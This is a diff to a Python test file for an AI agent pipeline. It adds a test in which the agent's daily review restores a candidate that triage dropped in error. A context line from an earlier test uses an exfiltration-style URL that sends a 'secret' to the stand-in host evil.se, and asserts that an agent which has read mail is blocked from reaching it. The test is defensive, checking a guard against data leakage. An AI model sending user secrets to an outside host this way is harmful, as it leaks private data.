@@ -183,3 +183,24 @@ async def test_chat_turn_that_read_mail_cannot_reach_new_addresses():
     assert "Not available after reading mail" in (await read({"url": "https://evil.se/?d=secret"}))["content"][0]["text"]
 
 
+
+
+async def test_the_daily_review_checks_triage_and_a_wrong_drop_comes_back(env, tmp_path):
+    # omgång 14, B: triage is Director's fast skill, and nobody looked at what it let go
+    from agent.pipeline.outbox import add_candidate
+
+    db, memory, research, sources = env
+    eid = await db.execute("INSERT INTO events (source, kind, dedupe_key, payload) VALUES ('stream:x', 'event', 'k', '{}')")
+    cid = await add_candidate(db, "event", "Hackathon online", "x", {}, event_id=eid)
+    await db.execute("UPDATE candidates SET status = 'dropped' WHERE id = ?", (cid,))
+    await db.insert("decisions", candidate_id=cid, module="triage@1", tier="drop", reason="utanför Stockholm")
+    calls = []
+    out = {**BASE, "working_memory": [], "triage_review": {"checked": 1, "notes": "online räknas",
+                                                            "wrong": [{"id": f"#F{cid}", "why": "Online räknas"}]}}
+    d = director(db, memory, tmp_path, structured=out, calls=calls)
+    await d.run("understand")
+    assert "Triagens stickprov" in calls[0].prompt and f"#F{cid}" in calls[0].prompt
+    assert (await db.fetchone("SELECT status FROM candidates WHERE id = ?", (cid,)))["status"] == "pending"
+    calls.clear()
+    await d.run("reflect")
+    assert "Triagens stickprov" not in calls[0].prompt   # the reflection thinks freely; the check is the daily review's
